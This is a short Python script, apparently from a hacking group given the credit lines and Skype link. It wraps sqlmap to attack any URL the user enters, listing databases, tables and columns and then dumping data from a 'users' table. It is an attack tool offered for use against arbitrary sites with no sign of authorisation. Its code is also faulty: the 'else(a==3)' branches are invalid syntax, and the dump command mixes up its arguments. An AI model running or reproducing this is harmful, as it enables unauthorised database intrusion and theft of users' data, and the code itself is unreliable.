import os
print('FEITO PELO PDL DO CLAN FALIDO CLEY(SKYPE=https://join.skype.com/invite/JZDH6UDIyDK9)')
site=str(input('digite a URL do site:'))
os.system('sqlmap -u {} --dbs'.format(site))
a=int(input('deseja continuar (sim=1 nao=2 nao sei usar=3):'))
if(a==1):
    site2=str(input('coleque aqui suas tabelas:'))
    os.system('sqlmap -u {} -D {} --tables'.format(site,site2))
    site3=str(input('digiti aqui suas colunas:'))
    os.system('sqlmap -u {} -D {} -T {} --columns'.format(site,site2,site3))
    site4=str(input('digit oque vc quer obiter:'))
    os.system('sqlmap -u {} -D {} -T users -C {} --dump'.format(site,site2,site3,site4))
else(a==3):
    print('para vc usar e saber oque vc esta usando utilise esse link::https://www.youtube.com/watch?v=XPrgJUt4_LQ&t=3s')
    print('FEITO PELO PDL DO CLAN FALIDO CLEY(SKYPE=https://join.skype.com/invite/JZDH6UDIyDK9)')
else(a==2):
    print('falou mano!!!')
    print('FEITO PELO PDL DO CLAN FALIDO CLEY(SKYPE=https://join.skype.com/invite/JZDH6UDIyDK9)')
